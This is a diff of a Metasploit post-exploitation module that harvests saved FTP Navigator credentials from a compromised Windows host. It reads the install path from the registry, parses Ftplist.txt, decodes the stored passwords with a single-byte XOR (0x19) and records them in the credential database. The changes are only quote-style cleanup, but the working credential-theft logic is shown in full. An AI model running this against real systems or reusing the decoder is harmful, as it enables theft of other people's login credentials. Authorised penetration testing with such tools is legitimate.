@@ -35,9 +35,9 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FTP Navigator_is1\\"
-    val_name = "InstallLocation"
-    installdir = registry_getvaldata(key, val_name) || "c:\\FTP Navigator\\"
+    key = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FTP Navigator_is1\\'
+    val_name = 'InstallLocation'
+    installdir = registry_getvaldata(key, val_name) || 'c:\\FTP Navigator\\'
 
     path = "#{installdir}Ftplist.txt"
 
@@ -45,31 +45,31 @@ class MetasploitModule < Msf::Post
       ftplist = client.fs.file.new(path, 'r')
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error("Unable to open Ftplist.txt: #{e}")
-      print_error("FTP Navigator May not Ne Installed")
+      print_error('FTP Navigator May not Ne Installed')
       return
     end
 
     lines = ftplist.read.split("\n")
     lines.each do |line|
-      next if line.include? "Anonymous=1"
-      next unless line.include? ";Password="
+      next if line.include? 'Anonymous=1'
+      next unless line.include? ';Password='
 
-      dpass = ""
-      username = ""
-      server = ""
-      port = ""
+      dpass = ''
+      username = ''
+      server = ''
+      port = ''
 
-      line.split(";").each do |field|
-        next if field.include? "SavePassword"
+      line.split(';').each do |field|
+        next if field.include? 'SavePassword'
 
-        if field.include? "Password="
+        if field.include? 'Password='
           epass = split_values(field)
           dpass = decode_pass(epass)
-        elsif field.include? "User="
+        elsif field.include? 'User='
           username = split_values(field)
-        elsif field.include? "Server="
+        elsif field.include? 'Server='
           server = split_values(field)
-        elsif field.include? "Port="
+        elsif field.include? 'Port='
           port = split_values(field)
         end
       end
@@ -78,15 +78,15 @@ class MetasploitModule < Msf::Post
       service_data = {
         address: Rex::Socket.getaddress(server),
         port: port,
-        protocol: "tcp",
-        service_name: "ftp",
+        protocol: 'tcp',
+        service_name: 'ftp',
         workspace_id: myworkspace_id
       }
 
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: username,
         private_data: dpass,
         private_type: :password
@@ -96,7 +96,7 @@ class MetasploitModule < Msf::Post
 
       login_data = {
         core: credential_core,
-        access_level: "User",
+        access_level: 'User',
         status: Metasploit::Model::Login::Status::UNTRIED
       }
 
@@ -105,13 +105,13 @@ class MetasploitModule < Msf::Post
   end
 
   def split_values(field)
-    values = field.split("=", 2)
+    values = field.split('=', 2)
     return values[1]
   end
 
   def decode_pass(encoded)
-    decoded = ""
-    encoded.unpack("C*").each do |achar|
+    decoded = ''
+    encoded.unpack('C*').each do |achar|
       decoded << (achar ^ 0x19)
     end
     return decoded
